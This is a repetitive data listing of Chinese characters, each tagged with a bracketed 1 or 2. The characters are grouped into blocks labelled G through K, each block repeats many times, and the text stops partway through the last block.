[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2]G一[1]不[1]中[1]为[1]上[1]个[1]主[1]下[1]三[1]两[1]业[1]相[2]与[1]常[1]常[2]七[1]东[1]世[1]清[1]带[1]万[1]温[1]许[2]且[1]布[1]酸[2]市[1]专[1]严[1]席[1]举[1]帮[1]师[1]司[2]吸[2]帝[1]丝[1]核[2]游[1]游[2]纸[2]渐[1]丰[1]脸[2]希[1]鸡[1]临[1]蒸[2]永[2] H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1]H工[1]起[2]样[2]已[1]路[1]海[2]己[1]具[2]深[1]号[2]价[2]德[2]左[1]差[1]巴[1]跟[1]跑[1]请[2]州[1]冷[2]混[1]混[2]距[1]获[2]践[1]雷[2]跳[1]卷[2]川[1] I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2]I时[2]家[2]制[2]其[2]然[2]并[2]件[2]阶[2]收[2]究[2]越[1]消[1]状[2]液[1]溶[2]叶[2]足[1]超[1]顶[2]银[2]茶[2]父[2]架[2]晶[2]延[2]胶[2]零[2]赶[2] J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1]J电[2]起[1]资[1]流[1]海[1]济[1]走[1]况[2]段[2]兵[2]测[1]念[2]侵[2]贵[2]践[2]赵[1]赵[2]浓[1]赶[1] K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋[1]洲[1]货[1]贵[1]临[2]K年[2]说[2]水[2]间[2]质[1]直[2]活[1]头[2]更[2]整[2]素[1]维[2]派[1]却[2]破[2]围[2]费[1]紧[1]致[2]负[1]兴[2]财[1]巴[2]责[1]轴[2]洋